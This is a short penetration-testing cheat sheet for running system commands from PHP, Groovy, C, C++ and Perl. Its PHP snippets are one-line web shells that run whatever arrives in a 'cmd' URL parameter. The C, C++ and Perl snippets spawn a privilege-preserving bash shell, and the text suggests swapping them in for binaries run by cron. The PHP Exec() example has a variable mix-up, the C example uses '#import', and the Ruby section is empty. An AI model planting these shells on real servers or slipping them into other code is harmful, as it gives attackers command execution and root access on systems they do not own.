# EXEC in Many Languages
This cheat sheet will provide many different examples of how to perform system(), exec(), and more in different web languages. Usage of these code listsings depends on the situation at hand. Sometimes, they can be added into scripts, used to replace binaries call from `cron` or scheduled tasks and much more. The usage is left to the discretion of the penetration tester. 
## WEB LANGUAGES
### PHP
PHP is widely used and can often have the system(), exec(), etc functions eenabled in the php.ini configuration file.
#### Exec()
```
<?php
 exec($_GET['cmd'],$response);
 var_dump($output) # dump entire object to DOM
 ?>
```
#### System()
```
<?php
 echo system($_GET['cmd']); # "echo()s" to the DOM
 ?>
```
#### Passthru()
```
<?php
 passthru($_GET['cmd']); # displays right to the DOM
 ?>
```
### Groovy
Groovy/Java can execute commands and print the output like so,
```
print "cmd /c mvn".execute().text
```
## C LANGUAGES
C and C-family languages usually require compilation, with the exception of JavaScript.
### C - System()
```
#import<stdlib.h>
int main(void){
 system("/bin/bash -p");
 return 0;

}
```
### C++ - System()
```
#include <bits/stdc++.h> 
using namespace std; 
int main(void){
 system("/bin/bash -p");
 return 0;

}
```
## Interpreterd Languages
Sometimes, scripts can also call `system()`
### Perl
```
perl -e 'system("/bin/bash -p");'
```
### Ruby
